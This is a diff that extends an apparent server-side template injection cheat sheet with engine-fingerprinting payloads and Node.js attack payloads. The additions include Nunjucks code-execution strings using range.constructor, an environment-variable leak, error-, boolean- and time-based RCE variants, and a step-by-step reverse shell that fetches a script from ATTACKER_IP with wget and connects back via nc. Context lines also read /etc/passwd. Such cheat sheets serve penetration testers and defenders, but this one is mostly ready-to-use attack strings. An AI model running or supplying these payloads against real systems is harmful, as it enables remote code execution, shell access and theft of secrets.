@@ -40,6 +40,39 @@ If `49` appears, template is executing code.
 | `<%= 7*7 %>` | 49 | ERB (Ruby) |
 | `#{7*7}` | 49 | Pebble, Thymeleaf |
 
+### Formal Template Engine Identification (ordered payloads)
+
+Use these payloads in order to narrow down the engine:
+
+| Payload | If Rendered | Engine |
+|---------|-------------|--------|
+| `D{{="O"}}T` | DOT | DotJS |
+| `P#{XXXXXXX}ug` | Pug | PugJS |
+| `Thym[[${session}]]eleaf` | Thymeleaf | Thymeleaf |
+| `Djan{{ Jinja2.Django }}go` | Django → **Django**; Jinja2 → **Jinja2** | Django or Jinja2 |
+
+### JavaScript (Node.js) Template Engines
+
+When the backend is Node.js/Express (check `X-Powered-By: Express`), use this table to identify the template engine by its tag syntax:
+
+| Template Engine | Payload Format |
+|-----------------|----------------|
+| DotJS | `{{= }}` |
+| DustJS | `{ }` |
+| EJS | `<% %>` |
+| HandlebarsJS | `{{ }}` |
+| HoganJS | `{{ }}` |
+| Lodash | `{{= }}` |
+| MustacheJS | `{{ }}` |
+| NunjucksJS | `{{ }}` |
+| PugJS | `#{ }` |
+| TwigJS | `{{ }}` |
+| UnderscoreJS | `<% %>` |
+| VelocityJS | `#=set($X="")$X` |
+| VueJS | `{{ }}` |
+
+**Reference:** [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
+
 ---
 
 ## Jinja2 (Python/Flask)
@@ -101,6 +134,90 @@ If `49` appears, template is executing code.
 {{ ['id'] | filter('system') }}
 {{ ['cat /etc/passwd'] | filter('system') }}
 {{ ['whoami'] | map('system') }}
+```
+
+---
+
+## Nunjucks (Node.js/Express)
+
+Nunjucks HTML-encodes all template variables by default (`'`, `"`, `&`, `<`, `>`). This breaks payloads containing those characters. Trivial payloads like `{{7*7}}` still work because they don't use special HTML characters.
+
+**Reference:** [Nunjucks — Exploiting Second-Order SSTI](https://adeadfed.com/posts/nunjucks-exploiting-second-order-ssti/)
+
+### Confirm SSTI
+
+```
+{{7*7}}
+```
+
+If the response reflects `49`, the engine is evaluating templates.
+
+### RCE via range.constructor
+
+This bypasses HTML encoding issues because the payload uses escaped quotes inside the outer JSON string:
+
+```
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+```
+
+Multi-step shell (avoids special characters in the payload by downloading a script):
+
+```bash
+# 1. Host a shell script
+cat shell.sh
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+python3 -m http.server 8000
+
+# 2. Download it
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('wget -O /tmp/shell.sh http://ATTACKER_IP:8000/shell.sh')")()}}
+
+# 3. Make executable
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('chmod 777 /tmp/shell.sh')")()}}
+
+# 4. Execute
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('/tmp/shell.sh')")()}}
+```
+
+### Environment Leak
+
+```
+{{range.constructor.constructor('return process.env')()}}
+```
+
+---
+
+## Universal Node.js SSTI Payloads
+
+These work across many Node.js template engines (DotJS, EJS, PugJS, UnderscoreJS, Eta, Nunjucks). Wrap in the appropriate tag for the engine.
+
+### Rendered RCE
+
+```javascript
+global.process.mainModule.require('child_process').execSync('id').toString()
+```
+
+### Error-Based RCE
+
+```javascript
+''['x'][global.process.mainModule.require('child_process').execSync('id').toString()]
+```
+
+```javascript
+global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
+```
+
+### Boolean-Based RCE
+
+```javascript
+[''][0 + !(global.process.mainModule.require('child_process').spawnSync('id', options={shell:true}).status===0)]['length']
+```
+
+### Time-Based RCE
+
+```javascript
+global.process.mainModule.require('child_process').execSync('id && sleep 5').toString()
 ```
 
 ---
